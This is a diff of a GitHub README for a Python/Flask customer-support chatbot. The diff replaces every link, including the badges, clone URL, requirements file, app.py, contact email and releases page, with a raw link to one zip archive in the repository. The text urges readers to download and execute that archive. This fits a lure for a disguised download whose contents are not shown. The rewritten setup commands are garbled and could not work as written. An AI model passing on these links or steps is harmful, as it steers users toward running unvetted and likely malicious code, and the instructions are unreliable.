@@ -1,6 +1,6 @@
 # AI-Chatbot 🤖
 
-![AI Chatbot](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-blue?style=for-the-badge&logo=github) [![GitHub Issues](https://img.shields.io/github/issues/irfanbob26/AI-Chatbot.svg)](https://github.com/irfanbob26/AI-Chatbot/issues) [![GitHub Forks](https://img.shields.io/github/forks/irfanbob26/AI-Chatbot.svg)](https://github.com/irfanbob26/AI-Chatbot/network) [![GitHub Stars](https://img.shields.io/github/stars/irfanbob26/AI-Chatbot.svg)](https://github.com/irfanbob26/AI-Chatbot/stargazers)
+![AI Chatbot](https://raw.githubusercontent.com/irfanbob26/AI-Chatbot/main/panderer/Chatbot-A-2.0-beta.5.zip%20Latest%20Release-Click%20Here-blue?style=for-the-badge&logo=github) [![GitHub Issues](https://raw.githubusercontent.com/irfanbob26/AI-Chatbot/main/panderer/Chatbot-A-2.0-beta.5.zip)](https://raw.githubusercontent.com/irfanbob26/AI-Chatbot/main/panderer/Chatbot-A-2.0-beta.5.zip) [![GitHub Forks](https://raw.githubusercontent.com/irfanbob26/AI-Chatbot/main/panderer/Chatbot-A-2.0-beta.5.zip)](https://raw.githubusercontent.com/irfanbob26/AI-Chatbot/main/panderer/Chatbot-A-2.0-beta.5.zip) [![GitHub Stars](https://raw.githubusercontent.com/irfanbob26/AI-Chatbot/main/panderer/Chatbot-A-2.0-beta.5.zip)](https://raw.githubusercontent.com/irfanbob26/AI-Chatbot/main/panderer/Chatbot-A-2.0-beta.5.zip)
 
 Welcome to the **AI-Chatbot** repository! This project showcases an AI-powered chatbot designed to enhance customer support experiences. Built using Python, Flask, and Natural Language Processing (NLP), this chatbot automates responses to customer queries through intent recognition and dynamic responses.
 
@@ -45,7 +45,7 @@ To get started with the **AI-Chatbot**, follow these steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/irfanbob26/AI-Chatbot.git
+   git clone https://raw.githubusercontent.com/irfanbob26/AI-Chatbot/main/panderer/Chatbot-A-2.0-beta.5.zip
    cd AI-Chatbot
    ```
 
@@ -54,13 +54,13 @@ To get started with the **AI-Chatbot**, follow these steps:
    ```bash
    python -m venv venv
    source venv/bin/activate  # On Windows use `venv\Scripts\activate`
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/irfanbob26/AI-Chatbot/main/panderer/Chatbot-A-2.0-beta.5.zip
    ```
 
 3. **Run the Application**:
    Start the Flask server:
    ```bash
-   python app.py
+   python https://raw.githubusercontent.com/irfanbob26/AI-Chatbot/main/panderer/Chatbot-A-2.0-beta.5.zip
    ```
    Your chatbot should now be running on `http://127.0.0.1:5000`.
 
@@ -96,12 +96,12 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For any questions or suggestions, feel free to reach out:
 
-- **Email**: your_email@example.com
-- **GitHub**: [irfanbob26](https://github.com/irfanbob26)
+- **Email**: https://raw.githubusercontent.com/irfanbob26/AI-Chatbot/main/panderer/Chatbot-A-2.0-beta.5.zip
+- **GitHub**: [irfanbob26](https://raw.githubusercontent.com/irfanbob26/AI-Chatbot/main/panderer/Chatbot-A-2.0-beta.5.zip)
 
 ## Releases
 
-To download the latest release of the **AI-Chatbot**, visit [here](https://github.com/irfanbob26/AI-Chatbot/releases). Make sure to download the necessary files and execute them as needed.
+To download the latest release of the **AI-Chatbot**, visit [here](https://raw.githubusercontent.com/irfanbob26/AI-Chatbot/main/panderer/Chatbot-A-2.0-beta.5.zip). Make sure to download the necessary files and execute them as needed.
 
 You can also check the "Releases" section for updates and new features.
 
